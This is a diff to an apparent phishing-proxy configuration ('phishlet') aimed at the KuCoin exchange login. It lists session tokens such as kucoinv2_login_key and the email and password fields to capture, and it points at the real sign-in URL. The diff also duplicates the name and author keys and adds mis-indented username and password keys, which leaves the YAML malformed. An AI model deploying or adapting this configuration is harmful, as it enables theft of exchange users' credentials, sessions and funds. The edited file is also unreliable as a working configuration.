@@ -1,5 +1,7 @@
 name: 'Rencora Security'
 author: 'Rencora'
+name: 'Rencora Security'
+author: 'Rencora'
 min_ver: '3.2.0'
 
 params:
@@ -27,10 +29,12 @@ auth_tokens:
   - domain: 'kucoin.com'
     keys: ['x-bullet-token, kucoinv2_bulletTokenKeyPrivate, kucoinv2_bulletTokenUidKey, kucoinv2_clientId, kucoinv2_login_key']
 
-creds:
+credentials:
+   username:
   - key: 'Email/Phone Number'
     search: ['(.*)']
     type: 'post'
+   password:
   - key: 'Login Password'
     search: ['(.*)']
     type: 'post'
@@ -42,4 +46,3 @@ login:
   url: https://www.kucoin.com/ucenter/signin
 
 # This is a demo example of a phishlet for 3.0 for my company Rencora
-
